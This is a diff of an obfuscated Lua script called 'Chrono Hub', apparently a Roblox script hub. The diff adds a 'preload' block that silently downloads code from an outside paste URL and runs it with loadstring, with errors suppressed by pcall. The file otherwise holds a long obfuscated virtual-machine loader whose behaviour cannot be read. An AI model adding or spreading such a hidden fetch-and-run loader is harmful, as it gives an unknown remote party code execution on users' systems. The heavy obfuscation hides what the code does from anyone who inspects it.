@@ -1,6 +1,192 @@
--- Chrono Hub | Protected
--- Obfuscated
+-- ================= PRELOAD SCRIPT =================
+pcall(function()
+loadstring(game:HttpGet(
+"https://api.rubis.app/v2/scrap/WBGp0WUUG81TmOeP/raw",
+true
+))()
+end)
 
-return(function(...)
--- return(function(...)do local emJRq=true local ymJRq=function() end if emJRq then else return end end local ymJRq={"GossOF==","GoTPGo4/","O7mB","iJT+rxbkpX==","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","GDk/NQ==","GBNC3M4D2IzP3iXqiokYQLEzYqUfmoJ7YmYcHdvgNMV9ym4RN5kq1DF/QKmQdg+lmdTPhINXEoeddKlAQomvyMvhma46bBk0KET5iDb9b7NJ1wkHjD23","NxkPNX==","GDs8OF==","YX==","Nxv8r7Y="}for emJRq,imJRq in ipairs({{1,11},{1,3},{4,11}})do while imJRq[1]<imJRq[2]do ymJRq[imJRq[1]],ymJRq[imJRq[2]],imJRq[1],imJRq[2]=ymJRq[imJRq[2]],ymJRq[imJRq[1]],imJRq[1]+1,imJRq[2]-1 end end local function imJRq(emJRq)return ymJRq[emJRq-24353]end do local emJRq=string.len local imJRq=string.sub local rmJRq=ymJRq local OZJRq=math.floor local vZJRq=table.concat local dZJRq=string.char local gZJRq=type local UZJRq={["1"]=10,g=4,w=7,M=3,["0"]=14,z=44,p=30,Z=43,["3"]=9,A=56,o=54,f=62,H=11,["9"]=58,J=53,d=22,a=6,q=50,["7"]=55,D=39,L=36,["+"]=41,v=49,["5"]=35,P=46,B=34,E=20,T=61,x=38,k=37,F=32,i=23,b=17,V=60,G=24,t=57,["/"]=52,n=63,Q=16,c=48,O=28,j=15,U=45,e=1,W=2,u=29,R=42,h=26,C=40,["2"]=13,l=12,r=27,["6"]=59,s=33,y=31,["8"]=47,m=21,Y=8,K=19,I=51,["4"]=5,N=25,X=0,S=18}local wZJRq=table.insert for ymJRq=1,#rmJRq,1 do local nZJRq=rmJRq[ymJRq]if gZJRq(nZJRq)=="string"then local gZJRq=emJRq(nZJRq)local aZJRq={}local TZJRq=1 local GZJRq=0 local oZJRq=0 while TZJRq<=gZJRq do local emJRq=imJRq(nZJRq,TZJRq,TZJRq)local ymJRq=UZJRq[emJRq]if ymJRq then GZJRq=GZJRq+ymJRq64^(3-oZJRq)oZJRq=oZJRq+1 if oZJRq==4 then oZJRq=0 local emJRq=OZJRq(GZJRq/65536)local ymJRq=OZJRq((GZJRq%65536)/256)local imJRq=GZJRq%256 wZJRq(aZJRq,dZJRq(emJRq,ymJRq,imJRq))GZJRq=0 end elseif emJRq=="="then wZJRq(aZJRq,dZJRq(OZJRq(GZJRq/65536)))if TZJRq>=gZJRq or imJRq(nZJRq,TZJRq+1,TZJRq+1)=vZJRq then OZJRq=OZJRq+rmJRq end emJRq,ymJRq,rmJRq=(emJRq-imJRq)/2,(ymJRq-vZJRq)/2,rmJRq2 end if emJRq<ymJRq then emJRq=ymJRq end while emJRq>0 do local ymJRq=emJRq%2 if ymJRq>0 then OZJRq=OZJRq+rmJRq end emJRq,rmJRq=(emJRq-ymJRq)/2,rmJRq2 end return OZJRq end local UZJRq=imJRq(24363)local wZJRq={}for ymJRq=1,#UZJRq,1 do wZJRq[OZJRq(UZJRq,ymJRq)]=ymJRq-1 end local nZJRq={}emJRq=setmetatable({},{[imJRq(24360)]=nZJRq})local function aZJRq(emJRq,vZJRq)local UZJRq=#emJRq local aZJRq={}local TZJRq=1 local GZJRq=0 local oZJRq=0 for imJRq=1,UZJRq,1 do GZJRq=GZJRq85+wZJRq[OZJRq(emJRq,imJRq)]oZJRq=oZJRq+1 if oZJRq==5 then local emJRq=ymJRq(GZJRq/16777216)%256 local imJRq=ymJRq(GZJRq/65536)%256 local rmJRq=ymJRq(GZJRq/256)%256 local OZJRq=GZJRq%256 aZJRq[TZJRq]=emJRq aZJRq[TZJRq+1]=imJRq aZJRq[TZJRq+2]=rmJRq aZJRq[TZJRq+3]=OZJRq TZJRq=TZJRq+4 GZJRq=0 oZJRq=0 end end if oZJRq>0 then local emJRq=5-oZJRq for emJRq=1,emJRq,1 do GZJRq=GZJRq85+84 end local imJRq=ymJRq(GZJRq/16777216)%256 local rmJRq=ymJRq(GZJRq/65536)%256 local OZJRq=ymJRq(GZJRq/256)%256 local vZJRq=GZJRq%256 if emJRq<4 then aZJRq[TZJRq]=imJRq TZJRq=TZJRq+1 end if emJRq<3 then aZJRq[TZJRq]=rmJRq TZJRq=TZJRq+1 end if emJRq<2 then aZJRq[TZJRq]=OZJRq TZJRq=TZJRq+1 end end local DZJRq=tostring(vZJRq)local zZJRq={}for emJRq=0,255,1 do zZJRq[emJRq]=emJRq end local cZJRq=0 local LZJRq=#DZJRq for emJRq=0,255,1 do cZJRq=((cZJRq+zZJRq[emJRq])+OZJRq(DZJRq,emJRq%LZJRq+1))%256 zZJRq[emJRq],zZJRq[cZJRq]=zZJRq[cZJRq],zZJRq[emJRq]end local SZJRq,FZJRq=0,0 local bZJRq={}local XZJRq=1 for emJRq=1,TZJRq-1,1 do SZJRq=(SZJRq+1)%256 FZJRq=(FZJRq+zZJRq[SZJRq])%256 zZJRq[SZJRq],zZJRq[FZJRq]=zZJRq[FZJRq],zZJRq[SZJRq]local ymJRq=(zZJRq[SZJRq]+zZJRq[FZJRq])%256 bZJRq[XZJRq]=rmJRq(gZJRq(aZJRq[emJRq],zZJRq[ymJRq]))XZJRq=XZJRq+1 end local kZJRq=dZJRq(bZJRq)while#kZJRq>0 and stringimJRq(24362)==0 do kZJRq=stringimJRq(24359)end nZJRq[vZJRq]=kZJRq end local function TZJRq()local emJRq=imJRq(24361)local ymJRq=imJRq(24355)local rmJRq=1 local OZJRq=1 local vZJRq=string[imJRq(24364)]local dZJRq=string[imJRq(24359)]while true do local imJRq=vZJRq(emJRq,ymJRq,rmJRq,true)local gZJRq if not imJRq then gZJRq=dZJRq(emJRq,rmJRq)else gZJRq=dZJRq(emJRq,rmJRq,imJRq-1)end local UZJRq=123456789+OZJRq777 aZJRq(gZJRq,UZJRq)if not imJRq then break end rmJRq=imJRq+1 OZJRq=OZJRq+1 end end TZJRq()end return(function(ymJRq,rmJRq,OZJRq,vZJRq,dZJRq,gZJRq,UZJRq,LZJRq,zZJRq,imJRq,aZJRq,SZJRq,FZJRq,oZJRq,DZJRq,nZJRq,GZJRq,TZJRq,wZJRq,cZJRq,bZJRq)SZJRq,TZJRq,nZJRq,wZJRq,cZJRq,zZJRq,aZJRq,oZJRq,DZJRq,LZJRq,GZJRq,FZJRq,bZJRq,imJRq=function(emJRq,ymJRq)local rmJRq=GZJRq(ymJRq)local OZJRq=function(OZJRq,vZJRq,dZJRq,gZJRq)return imJRq(emJRq,{OZJRq,vZJRq,dZJRq,gZJRq},ymJRq,rmJRq)end return OZJRq end,0,{},{},function(emJRq,ymJRq)local rmJRq=GZJRq(ymJRq)local OZJRq=function(OZJRq)return imJRq(emJRq,{OZJRq},ymJRq,rmJRq)end return OZJRq end,function(emJRq,ymJRq)local rmJRq=GZJRq(ymJRq)local OZJRq=function(...)return imJRq(emJRq,{...},ymJRq,rmJRq)end return OZJRq end,function()TZJRq=TZJRq+1 nZJRq[TZJRq]=1 return TZJRq end,function(emJRq)local ymJRq,imJRq=1,emJRq[1]while imJRq do nZJRq[imJRq],ymJRq=nZJRq[imJRq]-1,1+ymJRq if 0==nZJRq[imJRq]then nZJRq[imJRq],wZJRq[imJRq]=nil,nil end imJRq=emJRq[ymJRq]end end,function(emJRq)nZJRq[emJRq]=nZJRq[emJRq]-1 if 0==nZJRq[emJRq]then nZJRq[emJRq],wZJRq[emJRq]=nil,nil end end,function(emJRq,ymJRq)local rmJRq=GZJRq(ymJRq)local OZJRq=function(OZJRq,vZJRq,dZJRq,gZJRq,UZJRq)return imJRq(emJRq,{OZJRq,vZJRq,dZJRq,gZJRq,UZJRq},ymJRq,rmJRq)end return OZJRq end,function(ymJRq)for emJRq=1,#ymJRq,1 do nZJRq[ymJRq[emJRq]]=1+nZJRq[ymJRq[emJRq]]end if OZJRq then local imJRq=OZJRq(true)local rmJRq=dZJRq(imJRq)rmJRq[emJRq[123457566]],rmJRq[emJRq[123458343]],rmJRq[emJRq[123459120]]=ymJRq,oZJRq,function()return 1884199 end return imJRq else return vZJRq({},{[emJRq[123459897]]=oZJRq,[emJRq[123460674]]=ymJRq,[emJRq[123461451]]=function()return 1884199 end})end end,function(emJRq,ymJRq)local rmJRq=GZJRq(ymJRq)local OZJRq=function(OZJRq,vZJRq,dZJRq)return imJRq(emJRq,{OZJRq,vZJRq,dZJRq},ymJRq,rmJRq)end return OZJRq end,function(emJRq,ymJRq)local rmJRq=GZJRq(ymJRq)local OZJRq=function(OZJRq,vZJRq)return imJRq(emJRq,{OZJRq,vZJRq},ymJRq,rmJRq)end return OZJRq end,function(imJRq,OZJRq,vZJRq,dZJRq)local sZJRq,TZJRq,rZJRq,OvJRq,tZJRq,JZJRq,NZJRq,hZJRq,nZJRq,uZJRq,kZJRq,RZJRq,UZJRq,GZJRq,iZJRq,jZJRq,ZZJRq,oZJRq,dvJRq,WZJRq,XZJRq,gvJRq,zZJRq,KZJRq,AZJRq,vvJRq,QZJRq,lZJRq,eZJRq,qZJRq,HZJRq,xZJRq,VZJRq,BZJRq,MZJRq,pZJRq,IZJRq,yZJRq,YZJRq,EZJRq,mZJRq,PZJRq,CZJRq,fZJRq while imJRq do if imJRq<7297614 then if imJRq<3764129 then if imJRq<1685366 then if imJRq<919709 then if imJRq<581926 then if imJRq<257418 then if imJRq<203453 then if imJRq<194244 then imJRq=ymJRq[emJRq[123462228]]nZJRq=nil UZJRq={}else UZJRq=emJRq[123463005]CZJRq=UZJRq imJRq=12125854 CZJRq=nil end else if imJRq<244487 then imJRq=xZJRq and 2323475 or 789704 else imJRq={}nZJRq=imJRq imJRq=emJRq[123463782]TZJRq=imJRq imJRq=ymJRq[emJRq[123464559]]UZJRq={nZJRq}end end else if imJRq<412217 then if imJRq<364926 then imJRq=false UZJRq={imJRq}imJRq=ymJRq[emJRq[123465336]]else TZJRq=9001003286 nZJRq=emJRq[123466113]GZJRq=1003286 UZJRq=ymJRq[nZJRq]nZJRq=emJRq[123466890]imJRq=UZJRq[nZJRq]nZJRq=TZJRq-GZJRq UZJRq=imJRq(nZJRq)imJRq=1243191 end else imJRq=emJRq[123467667]hZJRq=imJRq imJRq=13156260 hZJRq=nil end end else if imJRq<761109 then if imJRq<695911 then if imJRq<623468 then imJRq=5348648 GZJRq=nil else imJRq=UZJRq and 1551871 or 3544733 end else PZJRq=emJRq[123468444]JZJRq=ymJRq[PZJRq]imJRq=JZJRq and 12659816 or 668080 UZJRq=JZJRq end else if imJRq<774266 then if imJRq<768871 then imJRq=1712936 imJRq=1391127 else imJRq=15474284 XZJRq=nil zZJRq=nil kZJRq=nil end else YZJRq=nil imJRq=9510892 uZJRq=nil kZJRq=nil pZJRq=nil end end end else if imJRq<1279825 then if imJRq<1034540 then if imJRq<1031037 then if imJRq<925968 then imJRq=false UZJRq={imJRq}imJRq=ymJRq[emJRq[123469221]]else imJRq=true imJRq=imJRq and 4726934 or 2125684 end else GZJRq=emJRq[123469998]zZJRq=emJRq[123470775]oZJRq=emJRq[123471552]nZJRq=emJRq[123472329]UZJRq=emJRq[123473106]TZJRq=emJRq[123473883]imJRq={UZJRq,nZJRq,TZJRq,GZJRq,oZJRq,zZJRq}UZJRq=emJRq[123474660]nZJRq=imJRq imJRq=ymJRq[UZJRq]oZJRq={imJRq(nZJRq)}GZJRq=oZJRq[3]imJRq=15474284 UZJRq=oZJRq[1]TZJRq=oZJRq[2]oZJRq=UZJRq end else if imJRq<1277766 then if imJRq<1086016 then imJRq=UZJRq and 15113582 or 8501668 else imJRq=false imJRq=imJRq and 4968966 or 382735 end else imJRq=TZJRq()imJRq=14021956 end end else if imJRq<1412005 then if imJRq<1338880 then if imJRq<1296940 then imJRq=TZJRq()imJRq=9396178 else GZJRq=nil imJRq=16559064 end else lZJRq=emJRq[123475437]PZJRq=ymJRq[lZJRq]HZJRq=0 lZJRq=emJRq[123476214]hZJRq=0 UZJRq=PZJRq[lZJRq]PZJRq=UZJRq()lZJRq={HZJRq,hZJRq}UZJRq=#lZJRq imJRq=PZJRq>UZJRq imJRq=imJRq and 761849 or 1712936 end else if imJRq<1539957 then if imJRq<1477237 then imJRq=true imJRq=imJRq and 4554700 or 15996521 else imJRq=UZJRq and 2090869 or 190135 end else imJRq=3544733 end end end end else if imJRq<2855076 then if imJRq<2318670 then if imJRq<2101169 then if imJRq<1773715 then if imJRq<1762957 then imJRq=emJRq[123476991]PZJRq=imJRq lZJRq=-595662 UZJRq=-593634 imJRq=UZJRq-lZJRq lZJRq=imJRq imJRq=6921742 else TZJRq=emJRq[123477768]nZJRq=ymJRq[TZJRq]imJRq=4573025 UZJRq=nZJRq end else if imJRq<1839044 then fZJRq=emJRq[123478545]jZJRq=#fZJRq CZJRq=hZJRq==jZJRq imJRq=7801490 UZJRq=CZJRq else TZJRq=emJRq[123479322]UZJRq=nZJRq[TZJRq]TZJRq=wZJRq[vZJRq[2]]zZJRq=emJRq[123480099]YZJRq=emJRq[123480876]imJRq=UZJRq-TZJRq uZJRq=emJRq[123481653]WZJRq=emJRq[123482430]UZJRq=emJRq[123483207]TZJRq=imJRq imJRq=wZJRq[vZJRq[3]]oZJRq=ymJRq[zZJRq]zZJRq=emJRq[123483984]GZJRq=oZJRq[zZJRq]kZJRq=wZJRq[vZJRq[4]]XZJRq=kZJRq[uZJRq]kZJRq=emJRq[123484761]zZJRq=XZJRq[kZJRq]pZJRq=wZJRq[vZJRq[4]]uZJRq=pZJRq[YZJRq]YZJRq=emJRq[123485538]pZJRq=emJRq[123486315]kZJRq=uZJRq[pZJRq]pZJRq=emJRq[123487092]uZJRq=TZJRq[pZJRq]XZJRq=kZJRq+uZJRq pZJRq=wZJRq[vZJRq[4]]uZJRq=pZJRq[YZJRq]pZJRq=emJRq[123487869]kZJRq=uZJRq[pZJRq]xZJRq=wZJRq[vZJRq[4]]YZJRq=xZJRq[WZJRq]xZJRq=emJRq[123488646]pZJRq=YZJRq[xZJRq]xZJRq=emJRq[123489423]YZJRq=TZJRq[xZJRq]uZJRq=pZJRq+YZJRq TZJRq=nil oZJRq=GZJRq(zZJRq,XZJRq,kZJRq,uZJRq)imJRq[UZJRq]=oZJRq imJRq=190135 end end else if imJRq<2206200 then if imJRq<2175872 then imJRq=10487817 else zZJRq=emJRq[123490200]oZJRq=ymJRq[zZJRq]imJRq=oZJRq and 4667867 or 9766126 UZJRq=oZJRq end else imJRq=UZJRq and 4002905 or 9023708 end end else if imJRq<2474199 then if imJRq<2381471 then if imJRq<2339392 then imJRq=true UZJRq={imJRq}imJRq=ymJRq[emJRq[123490977]]else VZJRq=emJRq[123491754]sZJRq=imJRq MZJRq=YZJRq[VZJRq]VZJRq=emJRq[123492531]qZJRq=MZJRq~=VZJRq imJRq=qZJRq and 14001962 or 9233043 KZJRq=qZJRq end else jZJRq=false imJRq=jZJRq and 15549857 or 16133949 end else if imJRq<2754802 then if imJRq<2657226 then kZJRq=zZJRq pZJRq=emJRq[123493308]ZZJRq=emJRq[123494085]imJRq=ymJRq[pZJRq]WZJRq=ymJRq[ZZJRq]ZZJRq=emJRq[123494862]xZJRq=WZJRq[ZZJRq]WZJRq={imJRq(xZJRq,uZJRq)}pZJRq=WZJRq[1]imJRq=pZJRq and 13949710 or 205946 YZJRq=WZJRq[2]xZJRq=pZJRq else imJRq=5209427 GZJRq=nil end else TZJRq=nil imJRq=LZJRq(6343731,{})UZJRq=emJRq[123495639]TZJRq=imJRq imJRq=cZJRq(14382006,{})GZJRq=imJRq 